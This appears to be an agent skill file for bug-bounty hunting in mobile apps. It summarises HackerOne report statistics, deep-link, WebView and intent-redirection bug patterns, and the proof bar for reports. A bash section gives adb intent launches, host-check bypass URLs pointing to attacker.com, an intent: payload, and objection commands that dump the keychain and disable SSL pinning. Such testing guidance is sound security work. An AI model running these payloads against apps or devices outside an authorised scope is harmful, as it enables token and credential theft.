# Upstream source: mobile (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/mobile/SKILL.md`

---

---
name: mobile
description: >-
  Hunt mobile app flaws. Use when testing Android/iOS apps, deep links, exported components, and local storage. Backed by 198 disclosed HackerOne reports.
---

# Mobile Application Security — HackerOne field guide

Built from **198** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **198** · paid: **67**
- Median bounty **$750** · p90 **$2,940** · max **$10,000** · total **$80,330**
- Median upvotes **18**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Mail.ru | 19 | $14,950 | 627 |
| GitHub Security Lab | 6 | $12,200 | 102 |
| X / xAI | 16 | $12,180 | 677 |
| Pornhub | 4 | $8,000 | 85 |
| Slack | 3 | $5,000 | 402 |
| VK.com | 7 | $4,400 | 261 |
| Shopify | 7 | $3,400 | 367 |
| Nextcloud | 26 | $3,275 | 515 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`deeplink` `intent` `webview` `keystore` `shared_prefs` `keychain`

## Tools

`apktool` · `jadx` · `Frida` · `objection` · `MobSF`

## Escalation chains

- Deeplink -> token theft.
- WebView bridge -> RCE.

## Related

- `auth-bypass` (989 reports)
- `crypto-and-secrets` (562 reports)
- `xss` (2,569 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs, misconfigs to look for

- **Pattern 1 — Deep link / custom-scheme hijack → OAuth code or token theft.** Android does NOT verify ownership of custom URI schemes; any installed app can register `myapp://`. A callback `myapp://oauth?code=...` can be intercepted; without PKCE the code is redeemed for a token. **CVE-2026-26123** (Microsoft Authenticator, patched Mar 2026) is the canonical 2026 example. Prefer verified HTTPS App Links (`android:autoVerify`, `assetlinks.json`); Android 12+ stricter web-intent handling reduces but does not remove collision risk (disambiguation dialog).
- **Pattern 2 — WebView host-check bypass (open redirect).** `startsWith("trusted.com")` / `contains("trusted.com")` / `endsWith("wikipedia.org")` are all bypassable: `trusted.com@attacker.com/`, `trusted.com.attacker.com/steal`, `evil-wikipedia.org` (endsWith matches). **GHSL-2026-101 / CVE-2026-65993** (Wikipedia Android `wikipedia://` handler): `evil-wikipedia.org.endsWith("wikipedia.org")` = true → all `centralauth_*` cookies (`centralauth_Session`, `centralauth_Token` ~30-day remember-me, `centralauth_User`) sent to attacker — global SSO across ~800 Wikimedia projects.
- **Pattern 3 — Intent redirection into private components.** Exported activity extracts a nested Intent from extras (or `Intent.parseUri()` on an `intent://` URL) and calls `startActivity()` → launches non-exported activities, ContentProviders, and can grant `FLAG_GRANT_READ_URI_PERMISSION` for file theft. **GHSL-2026-103 / CVE-2026-65994** (Wikipedia `PageActivity` → `SingleWebViewActivity`, JavaScript enabled + cookie-proxying OkHttp client, no domain validation). **EngageSDK (Microsoft, Apr 2026)**: intent redirection in a 3rd-party SDK, 50M+ installs across crypto wallets; fixed in v5.2.1 by making the activity non-exported. **CVE-2025-21079** (Samsung Members, Pwn2Own 2025): WebView 302 → `intent:` URI → `Intent.parseUri` → arbitrary exported activity, one-click via `CATEGORY_BROWSABLE`.
- **Pattern 4 — WebView as second-stage amplifier.** Authenticated WebView carries session cookies, localStorage, JS bridges, file access. Wikipedia's `OkHttpWebViewClient` injected `Access-Control-Allow-Origin: *` on every proxied response (same-origin-policy bypass → authenticated cross-origin reads). Message-handler actions (`{"action":"link"}` etc.) can open arbitrary URLs / `geo:` / `mailto:` intents or autoplay attacker audio.
- **Pattern 5 — Expired whitelist domain takeover.** The whitelist is not bypassed; a whitelisted domain expired and was re-registered by the attacker. Android checks pass, but the app sends auth headers to the attacker. Static analysis cannot detect ownership changes — needs runtime + domain-registration history checks (Oversecured, Apr 2026).
- **iOS equivalents:** custom URL schemes (validate input AND source application — MASTG-BEST-0054/0055), ATS exceptions in `Info.plist`, Keychain items with `kSecAttrAccessibleAlways` / `AfterFirstUnlock` instead of `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`, plaintext plists in the app container, jailbreak-detection and SSL-pinning implementations. MASVS v2.1 / MASTG v2 / MASWE (2026 refactoring) are the current mapping — profiles L1 / L2 / R / P replace the old verification levels.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

```bash
# Android: launch an exported activity with a hostile URI (adb, second device/app context)
adb shell am start -n org.wikipedia/org.wikipedia.page.PageActivity \
  -a android.intent.action.VIEW \
  -d 'thankyou.evil-wikipedia.org/wiki/PoC?order_id=1&wmf_campaign=Android&amount=5&currency=USD'
adb shell am start -a android.intent.action.VIEW \
  -d 'wikipedia://evil-wikipedia.org/wiki/Main_Page'     # endsWith host-bypass variant

# WebView host-check bypass payloads to try against any deep-link router
https://trusted.com@attacker.com/steal
https://trusted.com.attacker.com/steal
https://evil-trusted.com/                    # for contains/endsWith checks
intent:#Intent;package=com.target.app;component=com.target.app/.InternalActivity;S.extra=evil;end

# Static triage
aapt dump xmltree target.apk AndroidManifest.xml | grep -iE 'exported|intent-filter|autoVerify|scheme'
jadx or apktool: grep for startActivity(, Intent.parseUri, setJavaScriptEnabled(true),
  getCookies/loadForRequest, shouldOverrideUrlLoading, startsWith/endsWith host checks

# iOS runtime (Frida/objection; non-jailbroken path = repackage with Frida Gadget via Sideloadly)
objection -g <bundle-id> explore
ios keychain dump --json keychain_output.json    # look for authToken, JWT, pincode + accessibility class
ios sslpinning disable                           # then proxy through Burp
ios jailbreak disable
env                                              # bundle/data dirs
file download /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/<id>.plist
# class-dump -H <binary> -o headers/ ; strings <binary> | grep -iE 'key|secret|token|password|api'
```

Chains to test in order: **custom scheme hijack → captured OAuth code → token (PKCE absent)**; **deep link open-redirect → authenticated WebView → cookie/token exfil**; **exported activity → nested Intent → non-exported ContentProvider → file read**.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Prove real impact on a second controlled account or a safe callback** (existing reporting bar). For cookie/token theft, show the attacker-controlled server receiving a *live* `centralauth_*`-equivalent session token, then demonstrate that token authenticating to a second account/session. A 302 or a WebView loading your URL is not theft.
- **Attacker model matters — grade it honestly:** a local malicious-app prerequisite (Wikipedia GHSL cases, EngageSDK) is High/Critical for affected users but is NOT a remote one-click internet bug; Pwn2Own-style `CATEGORY_BROWSABLE` WebView→intent chains ARE remote one-click and grade higher. State the precondition explicitly in the finding.
- **Static-analysis blind spots:** host-string checks can look correct while the whitelisted domain has expired (Pattern 5), and SDK code may be the vulnerable layer (EngageSDK) rather than first-party code. Always confirm at runtime with a controlled domain.
- **WebView context is the amplifier:** require evidence that the loaded page actually had cookies/localStorage/JS bridge access (e.g., `setCookies()`/`loadForRequest()` call, `javaScriptEnabled=true`), not just "WebView navigated to attacker.com". An `Access-Control-Allow-Origin: *` injection must be shown enabling a cross-origin authenticated read.
- **iOS caveats:** keychain `kSecAttrAccessibleAlways` is a real finding only if the item is a secret; `env`/plist dumps on a simulator do not prove file-protection or Secure Enclave behavior. Check the actual accessibility class (`aku` = WhenUnlockedThisDeviceOnly is the safe value; `ak`, `dk`, `ck` are violations) and note jailbreak/simulator limitations in the report. A clean advisory/OSV lookup is not proof of absence.
- **MASVS mapping:** Android findings → MASVS-PLATFORM / MASTG-KNOW-0019; iOS → MASVS-STORAGE / NETWORK / PLATFORM; cite MASWE weakness IDs from the 2026 mapping where possible. Severity: token theft / WebView takeover = Critical; intent redirection to private data = High; missing `autoVerify`/scheme collision without a sensitive callback = Medium.

### D. Sources — numbered list of URLs you actually fetched

1. https://securitylab.github.com/advisories/GHSL-2026-103_apps-android-wikipedia/
2. https://securitylab.github.com/advisories/GHSL-2026-101_apps-android-wikipedia
3. https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks
4. https://developer.android.com/privacy-and-security/risks/intent-redirection
5. https://www.microsoft.com/en-us/security/blog/2026/04/09/intent-redirection-vulnerability-third-party-sdk-android
6. https://oversecured.com/blog/android-deep-link-vulnerabilities
7. https://breachauthority.com/posts/deep-link-and-intent-hijacking-in-android-applications
8. https://djini.ai/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/
9. https://support.google.com/faqs/answer/9267555
10. https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019
11. https://mas.owasp.org/MASTG/0x06b-iOS-Security-Testing
12. https://mas.owasp.org/MASVS/03-Using_the_MASVS
13. https://owasp.github.io/DevSecOpsGuideline/2-Process/2-4-Test/2-4-3-Mobile-Application-Security-Test
14. https://payloadplayground.com/blog/ios-security-testing-guide
15. https://www.redfoxsec.com/blog/ios-pen-testing-with-objection-a-complete-guide-for-security-professionals
16. https://codezup.com/ios-app-security-auditing-guide
